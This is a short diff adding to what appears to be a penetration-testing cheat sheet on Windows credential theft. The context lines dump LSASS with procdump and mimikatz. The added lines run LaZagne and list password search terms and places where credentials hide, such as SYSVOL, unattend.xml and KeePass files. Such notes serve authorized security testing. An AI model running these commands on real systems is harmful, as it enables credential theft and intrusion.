@@ -603,3 +603,24 @@ procdump.exe -accepteula -ma lsass.exe C:\Users\Administrator\Desktop\lsass.dmp
 #either exfil or perform locally 
 mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords
 ```
+
+### LaZagne (Windows Credential Extraction)
+
+```
+start LaZagne.exe all
+```
+
+Modules: browsers, chats, mails, memory, sysadmin, windows, wifi.
+
+### Credential Search Terms
+
+Key terms to search for in files and configs: `Passwords`, `Passphrases`, `Keys`, `Username`, `Creds`, `Users`, `Passkeys`, `configuration`, `dbcredential`, `dbpassword`, `pwd`, `Login`, `Credentials`
+
+### Additional Credential Locations
+
+* Passwords in Group Policy (SYSVOL share)
+* `web.config` files on dev machines
+* `unattend.xml`
+* AD user/computer description fields
+* KeePass databases (`*.kdbx`)
+* Files named `pass.txt`, `passwords.docx`, etc.
